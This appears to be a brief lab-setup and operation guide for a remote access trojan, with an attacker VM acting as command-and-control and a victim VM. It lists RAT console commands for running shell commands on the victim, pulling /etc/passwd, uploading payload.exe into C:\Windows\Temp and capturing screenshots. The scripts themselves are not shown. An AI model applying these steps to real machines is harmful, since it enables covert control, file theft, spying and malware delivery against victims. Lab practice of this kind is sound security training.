# Lab Setup Instructions:

On Attacker VM (C2 Server):


pip install pyautogui
python rat_client.py
On Victim VM:


python rat_server.py
Operation Guide:


# Execute command on victim
RAT> shell whoami

# Download file from victim
RAT> download /etc/passwd

# Upload malware to victim
RAT> upload ./payload.exe C:\\Windows\\Temp\\payload.exe

# Capture victim screen
RAT> screenshot

# Remove RAT from victim
RAT> kill

# Exit C2
RAT> exit